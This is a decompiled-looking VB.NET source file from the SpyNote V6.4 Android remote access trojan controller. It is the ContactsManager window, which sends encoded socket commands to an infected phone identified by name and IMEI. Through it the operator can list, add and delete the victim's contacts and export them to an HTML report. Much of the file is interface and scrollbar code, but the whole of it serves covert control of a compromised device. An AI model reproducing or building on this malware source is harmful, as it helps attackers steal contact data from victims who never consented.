﻿Imports Microsoft.VisualBasic.CompilerServices
Imports System.ComponentModel
Imports System.Drawing.Drawing2D
Imports System.Text
Imports SpyNote_V6._4.SN
Imports SpyNote_V6._4.SN.SpyNote.Stores
Imports SpyNote_V6._4.SN.Sockets.SpyNote.Client

Public Class ContactsManager
    Public TClient As SocketClient

    Private x As Integer

    Private y As Integer

    Private aq1 As Integer
    Private Sub AddToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles AddToolStripMenuItem.Click
        Dim contactsWrite As ContactsWrite = New ContactsWrite()
        If (contactsWrite.ShowDialog(Me) = System.Windows.Forms.DialogResult.OK) Then
            Try
                Dim str As String = contactsWrite.aName.Text.Trim()
                Dim str1 As String = contactsWrite.aNumber.Text.Trim()
                If (Operators.CompareString(str, "", False) <> 0 And Operators.CompareString(str1, "", False) <> 0) Then
                    Me.TClient.Send(String.Concat(New String() {Store.BFF(Store.buff, CLng(58)), Data.SplitData, str, Data.SplitData, str1}))
                End If
                contactsWrite.Close()
            Catch exception As System.Exception
                Console.WriteLine(exception)
                Console.WriteLine(exception)
                contactsWrite.Close()
            End Try
        Else
            contactsWrite.Close()
        End If
    End Sub

    Private Sub ALOLO_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Resize
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub BOXDOWN_Paint(ByVal sender As Object, ByVal e As PaintEventArgs) Handles BOXDOWN.Paint
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(30, 30, 30)
        Dim rectangle As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 0, Me.BOXDOWN.Width, Me.BOXDOWN.Height)
        ControlPaint.DrawBorder(e.Graphics, rectangle, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.Solid, color, 1, ButtonBorderStyle.None, color, 1, ButtonBorderStyle.None)
        Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 8.25!, FontStyle.Regular)
        Dim solidBrush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(255, 241, 241, 241))
        Dim rowCount As Integer = Me.ViewManager.Rows.GetRowCount(DataGridViewElementStates.Selected)
        Dim str As String = String.Concat("Selected ", rowCount.ToString())
        Dim backColor As System.Drawing.Color = Me.BOXDOWN.BackColor
        Dim r As Byte = backColor.R
        backColor = Me.BOXDOWN.BackColor
        Dim g As Byte = backColor.G
        backColor = Me.BOXDOWN.BackColor
        Dim brush As System.Drawing.Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(220, CInt(r), CInt(g), CInt(backColor.B)))
        Dim size As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Ln ", Me.aq1.ToString()), font)
        Dim size1 As System.Drawing.Size = TextRenderer.MeasureText(str, font)
        Dim rectangle1 As System.Drawing.Rectangle = New System.Drawing.Rectangle(0, 2, Me.BOXDOWN.Width, size1.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle1)
        e.Graphics.DrawString(str, font, solidBrush, 0!, 2.0!)
        Dim num As Integer = CInt(Math.Round(CDbl(Me.BOXDOWN.Width) / 2))
        Dim width As Integer = Me.BOXDOWN.Width - size.Width
        rowCount = Me.ViewManager.Rows.Count
        Dim size2 As System.Drawing.Size = TextRenderer.MeasureText(String.Concat("Count ", rowCount.ToString()), font)
        Dim rectangle2 As System.Drawing.Rectangle = New System.Drawing.Rectangle(num, 2, Me.BOXDOWN.Width, size2.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle2)
        Dim graphics As System.Drawing.Graphics = e.Graphics
        rowCount = Me.ViewManager.Rows.Count
        graphics.DrawString(String.Concat("Count ", rowCount.ToString()), font, solidBrush, CSng(num), 2.0!)
        Dim rectangle3 As System.Drawing.Rectangle = New System.Drawing.Rectangle(width, 2, Me.BOXDOWN.Width, size.Height)
        e.Graphics.FillRectangle((New Pen(brush)).Brush, rectangle3)
        e.Graphics.DrawString(String.Concat("Ln ", Me.aq1.ToString()), font, solidBrush, CSng(width), 2.0!)
    End Sub

    Private Sub ContactsManager_Load(ByVal sender As Object, ByVal e As EventArgs) Handles Me.Load
        MyBase.Icon = New System.Drawing.Icon(String.Concat(Store.Resources(1), "\Icons\window\win\7.ico"))
        Me.PCNOTF.Image = Store.Bitmap_0("NFD\nf")
        Me.ContextContacts.Renderer = New ThemeToolStrip()
        Me.TScrolls.Interval = Store.TScrollsInterval
        Me.TProgressBar.Interval = Store.TProgressBarInterval
        Me.TProgressBar.Enabled = True
        Me.TScrolls.Enabled = True
        Me.Trans.Interval = Store.transparency
        Me.Trans.Enabled = True
    End Sub

    Private Sub ContactsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ContactsToolStripMenuItem.Click
        If (Me.ViewManager.SelectedRows.Count > 0) Then
            For i As Integer = Me.ViewManager.SelectedRows.Count - 1 To 0 Step -1
                If (Me.TClient IsNot Nothing) Then
                    If (Not Me.TClient.IsClose) Then
                        Dim str As String = Conversions.ToString(Me.ViewManager.Rows(Me.ViewManager.SelectedRows(i).Index).Cells(1).Value)
                        Me.TClient.Send(String.Concat(Store.BFF(Store.buff, CLng(57)), Data.SplitData, str))
                        Me.ViewManager.Rows.RemoveAt(Me.ViewManager.SelectedRows(i).Index)
                    End If
                End If
            Next

        End If
        Try
            Me.NF()
        Catch exception As System.Exception
            Console.WriteLine(exception)
        End Try
    End Sub

    Private Sub ContextContacts_Opening(ByVal sender As Object, ByVal e As CancelEventArgs) Handles ContextContacts.Opening
        If (Me.ViewManager.Rows.Count <> 0) Then
            Me.ContactsToolStripMenuItem.Enabled = True
        Else
            Me.ContactsToolStripMenuItem.Enabled = False
        End If
    End Sub
    Private Sub GridViewoVerticalScrollBar0()
        Dim flag As Boolean = Me.PCNOTF.Visible > False
        If flag Then
            Dim flag2 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
            If flag2 Then
                Me.VisualStudioHorizontalScrollBar1.Visible = False
            End If
            Dim flag3 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
            If flag3 Then
                Me.VisualStudioVerticalScrollBar1.Visible = False
            End If
        Else
            Dim columnsWidth As Integer = Me.ViewManager.Columns.GetColumnsWidth(DataGridViewElementStates.Visible)
            Dim flag4 As Boolean = columnsWidth >= Me.ViewManager.Width
            If flag4 Then
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth - Me.ViewManager.Width
            Else
                Me.VisualStudioHorizontalScrollBar1.Maximum = columnsWidth
            End If
            Dim flag5 As Boolean = columnsWidth > Me.ViewManager.Width
            If flag5 Then
                Dim flag6 As Boolean = Not Me.VisualStudioHorizontalScrollBar1.Visible
                If flag6 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = True
                End If
            Else
                Dim flag7 As Boolean = Me.VisualStudioHorizontalScrollBar1.Visible > False
                If flag7 Then
                    Me.VisualStudioHorizontalScrollBar1.Visible = False
                End If
            End If
            Dim flag8 As Boolean = Me.ViewManager.Rows.Count > 0
            If flag8 Then
                Dim num As Integer = Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height
                Dim flag9 As Boolean = num > Me.ViewManager.Height
                If flag9 Then
                    Dim flag10 As Boolean = Not Me.VisualStudioVerticalScrollBar1.Visible
                    If flag10 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = True
                    End If
                Else
                    Dim flag11 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                    If flag11 Then
                        Me.VisualStudioVerticalScrollBar1.Visible = False
                    End If
                End If
            Else
                Dim flag12 As Boolean = Me.VisualStudioVerticalScrollBar1.Visible > False
                If flag12 Then
                    Me.VisualStudioVerticalScrollBar1.Visible = False
                End If
            End If
        End If
    End Sub

    Private Function IMG(ByVal n As String) As Object
        Dim bitmap As Object
        Dim str As String
        Dim color As System.Drawing.Color = System.Drawing.Color.FromArgb(74, 74, 75)
        str = If(n.Length <= 0, "?", n(0).ToString().ToUpper())
        Dim solidBrush As Brush = New System.Drawing.SolidBrush(System.Drawing.Color.FromArgb(190, 190, 190))
        Dim font As System.Drawing.Font = New System.Drawing.Font("Segoe UI Semibold", 9.0!, FontStyle.Regular)
        Dim size As System.Drawing.Size = TextRenderer.MeasureText(str, font)
        Dim bitmap1 As System.Drawing.Bitmap = New System.Drawing.Bitmap(35, 35)
        Dim num As Integer = 18 - CInt(Math.Round(CDbl(size.Width) / 2)) - 1
        Dim num1 As Integer = 18 - CInt(Math.Round(CDbl(size.Height) / 2)) - 3
        Using bitmap2 As System.Drawing.Bitmap = New System.Drawing.Bitmap(bitmap1.Width - 3, bitmap1.Height - 3)
            Using graphic As Graphics = Graphics.FromImage(bitmap2)
                graphic.SmoothingMode = SmoothingMode.AntiAlias
                graphic.FillEllipse(New System.Drawing.SolidBrush(color), 0, 0, bitmap1.Width - 6, bitmap1.Height - 6)
                graphic.DrawString(str, font, solidBrush, CSng(num), CSng(num1))
                Using textureBrush As System.Drawing.TextureBrush = New System.Drawing.TextureBrush(bitmap1)
                    textureBrush.TranslateTransform(0!, 0!)
                    Using graphicsPath As System.Drawing.Drawing2D.GraphicsPath = New System.Drawing.Drawing2D.GraphicsPath()
                        graphicsPath.AddEllipse(0, 0, bitmap1.Width - 6, bitmap1.Height - 6)
                        graphic.FillPath(textureBrush, graphicsPath)
                    End Using
                End Using
            End Using
            bitmap = New System.Drawing.Bitmap(bitmap2)
        End Using
        Return bitmap
    End Function
    Private Sub NF()
        If (Me.ViewManager.Rows.Count <= 0) Then
            If (Me.PCNOTF.Dock = DockStyle.None) Then
                Me.PCNOTF.Dock = DockStyle.Fill
            End If
            If (Not Me.PCNOTF.Visible) Then
                Me.PCNOTF.Visible = True
            End If
        Else
            If (Me.PCNOTF.Dock = DockStyle.Fill) Then
                Me.PCNOTF.Dock = DockStyle.None
            End If
            If (Me.PCNOTF.Visible) Then
                Me.PCNOTF.Visible = False
            End If
        End If
    End Sub

    Private Sub RefreshToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RefreshToolStripMenuItem.Click
        If (Me.TClient IsNot Nothing) Then
            Me.TClient.Send(Store.BFF(Store.buff, CLng(26)))
        End If
    End Sub

    Private Sub RefScrolls()
        Dim num As Integer = 0
        If (MyBase.Visible) Then
            SyncLock Me.ViewManager
                If (Me.ViewManager.Rows.Count > 0) Then
                    If (Me.ViewManager.Rows.Count * Me.ViewManager.Rows(0).Height > Me.ViewManager.Height) Then
                        num = CInt(Math.Round(CDbl(Me.ViewManager.Height) / CDbl(Me.ViewManager.Rows(0).Height))) - 2
                        If (num < 0) Then
                            num = 0
                        End If
                    End If
                End If
                Me.VisualStudioVerticalScrollBar1.Maximum = Me.ViewManager.Rows.Count - num
                Me.GridViewoVerticalScrollBar0()
            End SyncLock
        End If
    End Sub

    Public Sub TData(ByVal Ay As Array)
        Try
            Dim value As String = CStr(Ay.GetValue(0))
            If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(83)), False) <> 0) Then
                If (Operators.CompareString(value, Store.BFF(Store.buff, CLng(84)), False) = 0) Then
                    Me.ViewManager.Rows.Clear()
                    Dim stringBuilder As System.Text.StringBuilder = New System.Text.StringBuilder()
                    stringBuilder.Append(String.Concat("<title>Android Tester - ", MyBase.Name, "</title>"))
                    Dim stringBuilder1 As System.Text.StringBuilder = New System.Text.StringBuilder()
                    stringBuilder1.Append(String.Concat(New String() {"</tr><th>", Me.ViewManager.Columns(1).HeaderText, "</th><th>", Me.ViewManager.Columns(2).HeaderText, "</th><th>", Me.ViewManager.Columns(3).HeaderText, "</th><tr>"}))
                    Dim stringBuilder2 As System.Text.StringBuilder = New System.Text.StringBuilder()
                    Dim strArrays As String() = CStr(Ay.GetValue(1)).Split(New String() {Data.SplitLines}, StringSplitOptions.RemoveEmptyEntries)
                    Dim length As Integer = CInt(strArrays.Length) - 1
                    Dim num As Integer = 0
                    Do
                        Dim strArrays1 As String() = strArrays(num).Split(New String() {Data.SplitArray}, StringSplitOptions.RemoveEmptyEntries)
                        Me.ViewManager.Rows.Add(New Object() {Me.IMG(strArrays1(0)), strArrays1(0), strArrays1(1), strArrays1(2)})
                        stringBuilder2.Append(String.Concat(New String() {"</tr> <td>", strArrays1(0), "</td><td>", strArrays1(1), "</td><td>", strArrays1(2), "</td><tr>" & vbCrLf & ""}))
                        num = num + 1
                    Loop While num <= length
                    If (stringBuilder2.Length > 0) Then
                        Store.StartThread(DirectCast((New Object() {stringBuilder, stringBuilder1, stringBuilder2, String.Concat(Me.TClient.ClientName, "_", Me.TClient.ClientImei), "ContactsManager"}), Array))
                    End If
                End If
            End If
        Catch exception As System.Exception
            Console.WriteLine(exception)
        End Try
        Try
            Me.NF()
        Catch exception1 As System.Exception
            Console.WriteLine(exception1)
        End Try
    End Sub

    Private Sub TProgressBar_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TProgressBar.Tick
        If (Me.TClient Is Nothing) Then
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        ElseIf (Not Me.TClient.IsClose) Then
            If (Me.Text <> MyBase.Tag) Then
                Me.Text = Conversions.ToString(MyBase.Tag)
            End If
            If (Me.ProgressBar1.Colour1 <> Color.FromArgb(140, 140, 140)) Then
                Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)
                Me.ProgressBar1.Colour0 = Color.FromArgb(140, 140, 140)
            End If
            Me.ProgressBar1.Value = Me.TClient.mProgressBar(Store.BFF(Store.buff, CLng(77)), "null")
        Else
            Me.Text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(MyBase.Tag, Strings.Space(1)), "-> Connection Lost ..."))
            If (Me.ProgressBar1.Value <> 100) Then
                Me.ProgressBar1.Value = 100
                If (Me.ProgressBar1.Colour1 = Color.FromArgb(140, 140, 140)) Then
                    Me.ProgressBar1.Colour0 = Color.FromArgb(128, 128, 128)
                    Me.ProgressBar1.Colour1 = Color.FromArgb(88, 88, 88)
                End If
            End If
        End If
    End Sub

    Private Sub Trans_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles Trans.Tick
        If (MyBase.Opacity = 1) Then
            Me.Trans.Enabled = False
        Else
            MyBase.Opacity = MyBase.Opacity + 0.1
        End If
    End Sub

    Private Sub TScrolls_Tick(ByVal sender As Object, ByVal e As EventArgs) Handles TScrolls.Tick
        Me.RefScrolls()
    End Sub

    Private Sub ViewManager_CellMouseClick(ByVal sender As Object, ByVal e As DataGridViewCellMouseEventArgs) Handles ViewManager.CellMouseClick
        If (e.RowIndex <> -1) Then
            Me.VisualStudioVerticalScrollBar1.Llen = If(e.RowIndex >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.RowIndex)
        End If
    End Sub

    Private Sub ViewManager_MouseClick(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseClick
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_MouseWheel(ByVal sender As Object, ByVal e As MouseEventArgs) Handles ViewManager.MouseWheel
        If (e.Delta <= 1) Then
            Dim visualStudioVerticalScrollBar1 As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            visualStudioVerticalScrollBar1.Value = visualStudioVerticalScrollBar1.Value + 1
        Else
            Dim value As VisualStudioVerticalScrollBar = Me.VisualStudioVerticalScrollBar1
            value.Value = value.Value - 1
        End If
    End Sub

    Private Sub ViewManager_RowsAdded(ByVal sender As Object, ByVal e As DataGridViewRowsAddedEventArgs) Handles ViewManager.RowsAdded
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowsRemoved(ByVal sender As Object, ByVal e As DataGridViewRowsRemovedEventArgs) Handles ViewManager.RowsRemoved
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_RowStateChanged(ByVal sender As Object, ByVal e As DataGridViewRowStateChangedEventArgs) Handles ViewManager.RowStateChanged
        If (e.Row.Index <> -1) Then
            If (e.StateChanged = DataGridViewElementStates.Selected) Then
                Me.aq1 = e.Row.Index + 1
                Me.VisualStudioVerticalScrollBar1.Llen = If(e.Row.Index >= Me.VisualStudioVerticalScrollBar1.Maximum, Me.VisualStudioVerticalScrollBar1.Maximum, e.Row.Index)
            End If
        ElseIf (e.StateChanged <> DataGridViewElementStates.Selected) Then
            Me.aq1 = 0
        Else
            Me.aq1 = 1
        End If
        Me.BOXDOWN.Invalidate()
    End Sub

    Private Sub ViewManager_Scroll(ByVal sender As Object, ByVal e As ScrollEventArgs) Handles ViewManager.Scroll
        If (e.ScrollOrientation <> ScrollOrientation.HorizontalScroll) Then
            Me.y = e.NewValue
            Me.VisualStudioVerticalScrollBar1.Value = Me.y
        Else
            Me.x = e.NewValue
            Me.VisualStudioHorizontalScrollBar1.Value = Me.x
        End If
    End Sub

    Private Sub ViewManager_Sorted(ByVal sender As Object, ByVal e As EventArgs) Handles ViewManager.Sorted
        Me.VisualStudioVerticalScrollBar1.Llen = -1
    End Sub

    Private Sub VisualStudioHorizontalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioHorizontalScrollBar1.Scroll
        Try
            If (Me.ViewManager.HorizontalScrollingOffset <> -1) Then
                Me.ViewManager.HorizontalScrollingOffset = Me.VisualStudioHorizontalScrollBar1.Value
            End If
        Catch exception As System.Exception
            Console.WriteLine(exception)
        End Try
    End Sub

    Private Sub VisualStudioVerticalScrollBar1_Scroll_1(ByVal sender As Object) Handles VisualStudioVerticalScrollBar1.Scroll
        Try
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex <> -1) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.VisualStudioVerticalScrollBar1.Value
            End If
        Catch exception As System.Exception
            Console.WriteLine(exception)
            If (Me.ViewManager.FirstDisplayedScrollingRowIndex >= 0) Then
                Me.ViewManager.FirstDisplayedScrollingRowIndex = Me.ViewManager.RowCount - 1
            End If
        End Try
    End Sub
End Class